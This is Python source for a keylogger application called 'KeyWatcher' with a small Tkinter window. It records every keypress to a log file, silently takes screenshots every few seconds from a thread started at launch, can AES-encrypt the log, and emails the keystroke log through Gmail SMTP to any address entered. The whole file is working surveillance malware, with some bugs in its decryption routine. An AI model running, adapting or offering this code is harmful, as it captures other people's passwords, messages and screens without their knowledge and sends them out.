from pynput.keyboard import Listener as KeyboardListener

import logging
import smtplib
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders
from tkinter import *
from PIL import ImageGrab
from multiprocessing import Process, freeze_support
import datetime
import threading
import os
import numpy as np
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
import cv2
import random
import time
import pyautogui
from dotenv import load_dotenv



load_dotenv()


EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
root = Tk()
root.title("KeyWatcher")
root.geometry('350x200')

 
log_dir = r"D:/Hacvker/"
logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
keylogger_running = False
listener = None
mouse_listener = None

current_date= datetime.datetime.now().strftime("%Y-%m-%d")
date_dir = os.path.join(log_dir,current_date)
if not os.path.exists(date_dir):
    os.makedirs(date_dir)



def output_key(key):
    logging.info(f"Key pressed: {key}")

def pad(data):
    padding_length = 16 - len(data) % 16
    padding = bytes([padding_length] * padding_length)
    return data + padding

def unpad(data):
    padding_length = data[-1]
    if padding_length < 1 or padding_length > 16:
        raise ValueError("Invalid padding encountered")
    return data[:-padding_length]
def encrypt_file():
    key = os.urandom(32)
    iv = os.urandom(16)
    cipher = AES.new(key,AES.MODE_CBC,iv)
    try:
        with open("D:/Hacvker/keyLog.txt",'rb') as f:
            plaintext = f.read()
        padded_plaintext = pad(plaintext)
        ciphertext = cipher.encrypt(padded_plaintext)
        with open("D:/Hacvker/keyLog.txt", 'wb') as f:
            f.write(ciphertext)
        encoded_key = key.hex()
        encoded_iv = iv.hex()
        return encoded_key, encoded_iv
    except Exception as e:
        print(f"An error occurred during encryption: {e}")
        return None, None
def decrypt_file(key,iv):
    try:
        decoded_key = bytes.fromhex(key)
        iv_bytes = bytes.fromhex(key)
        cipher = AES.new(decoded_key, AES.MODE_CBC, iv_bytes)
        with open("D:/Hacvker/keyLog.txt", 'rb') as f:
            encrypted_data = f.read()
        decrypted_data = unpad(cipher.decrypt(encrypted_data))
        with open("D:/Hacvker/keyLog.txt",'rb') as f:
            f.write(decrypted_data)


    except Exception as e:
        print(f"An error occurred during decryption: {e}")




def send_email_with_attachment():
    fromaddr = EMAIL_ADDRESS
    toaddr = recipient_email_entry.get()

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Test"
    body = "Logged files"
    msg.attach(MIMEText(body, 'plain'))
    filename = "keyLog.txt"
    attachment = open("D:/Hacvker/keyLog.txt", "rb")
    p = MIMEBase('application', 'octet-stream') 
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p) 
    s = smtplib.SMTP('smtp.gmail.com', 587) 
    s.starttls()
    s.login(fromaddr, EMAIL_PASSWORD) 
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit() 
 

def start_keylogger():
    global keylogger_running,listener
    if keylogger_running:
        listener.stop()
        listener = None
        toggle_button.config(text="Start Keylogger")
        keylogger_running = False
    else:
        listener = KeyboardListener(on_press=output_key)
        listener.start()
        toggle_button.config(text="Stop Keylogger")
        keylogger_running = True

def take_random_screenshots():
    while True:
        random_time = random.randint(1, 5)
        time.sleep(random_time)
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        file_name = os.path.join(date_dir, f"screenshot_{timestamp}.png")
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save(file_name)
        print(f"Screenshot saved as {file_name}")

screenshot_thread = threading.Thread(target=take_random_screenshots, daemon=True)
screenshot_thread.start()

toggle_button = Button(root, text="Start Keylogger", command=start_keylogger)
toggle_button.pack(pady=20)

recipient_label = Label(root, text="Enter recipient email:")
recipient_label.pack()
recipient_email_entry = Entry(root, width=30)
recipient_email_entry.pack(pady=5)

send_button = Button(root, text="Send email", command=send_email_with_attachment)
send_button.pack(pady=20)



root.mainloop()
